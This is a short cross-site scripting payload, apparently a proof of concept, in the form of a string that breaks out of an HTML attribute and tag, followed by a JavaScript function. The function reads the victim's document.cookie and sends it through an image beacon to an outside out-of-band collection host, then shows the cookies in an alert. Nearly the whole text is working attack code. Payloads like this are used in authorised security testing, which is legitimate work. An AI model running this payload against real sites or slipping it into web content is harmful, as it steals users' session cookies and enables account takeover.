";></a>

(function() {
  // Construct a beacon with cookie contents
  var i = new Image();
  i.src = "https://d2s3r4mth8rhgt5fbi50garw8bcd5f1k6.oast.live/collect?c=" + encodeURIComponent(document.cookie);

  // Optional: also show visible proof
  alert("XSS PoC, cookies: " + document.cookie);
})();
